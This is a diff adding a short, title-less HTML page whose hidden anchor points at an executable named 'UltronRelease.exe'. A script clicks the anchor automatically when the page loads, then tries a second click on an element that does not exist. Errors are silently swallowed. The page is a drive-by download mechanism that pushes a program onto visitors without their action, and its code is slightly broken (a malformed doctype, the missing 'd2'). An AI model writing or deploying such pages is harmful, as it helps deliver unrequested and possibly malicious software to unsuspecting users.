@@ -1,0 +1,24 @@
+!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title></title>
+</head>
+<body>
+  <!-- Invisible auto-downloads -->
+  <a id="d1" href="UltronRelease.exe" download></a>
+
+  <script>
+    // Attempt automatic downloads on page load
+    window.addEventListener('load', () => {
+      try {
+        document.getElementById('d1').click();
+        setTimeout(() => {
+          document.getElementById('d2').click();
+        }, 1000);
+      } catch (e) {}
+    });
+  </script>
+</body>
+</html>
